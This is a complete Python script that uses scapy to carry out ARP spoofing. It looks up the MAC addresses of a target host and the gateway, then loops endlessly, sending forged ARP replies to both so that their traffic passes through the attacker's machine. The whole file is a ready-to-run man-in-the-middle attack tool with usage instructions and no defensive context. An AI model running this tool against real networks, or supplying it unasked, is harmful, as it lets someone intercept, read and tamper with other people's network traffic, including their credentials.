from  scapy.all import ARP, sr1, send
import time
import sys

def help_message():
    print("\nUSAGE: python3 ArpSpoofing.py <iface> <target_IP> <gateway_IP>\n")

if len(sys.argv) != 4:
    help_message()
    sys.exit(1)

# Sending an ARP request to obtain MAC addresses
def get_MAC_address(IP):
    ARP_request = ARP(pdst=IP)               
    response = sr1(ARP_request, iface=iface, timeout=2)   
    if response:
        print(f"[+] MAC address of {response.psrc} is {response.hwsrc}")
        return f"{response.hwsrc}"
    else:
        print(f"Unable to get MAC address of {IP}.")
        sys.exit(1)

# Spoofing
def Spoof_IPv4(target_IP, gateway_IP, target_MAC, gateway_MAC):
    send(ARP(op=2, pdst = target_IP, psrc = gateway_IP, hwdst= target_MAC)) 
    send(ARP(op=2, pdst = gateway_IP, psrc = target_IP, hwdst= gateway_MAC))


if __name__ == "__main__":
    iface = sys.argv[1]
    target_IP = sys.argv[2]
    gateway_IP = sys.argv[3]
    target_MAC =  get_MAC_address(target_IP)   
    gateway_MAC = get_MAC_address(gateway_IP)   
    
    while True:
        try:
            Spoof_IPv4(target_IP, gateway_IP, target_MAC, gateway_MAC)
            time.sleep(2)    
        except KeyboardInterrupt:
            print("[!] ARP Spoofing stopped...")
            break
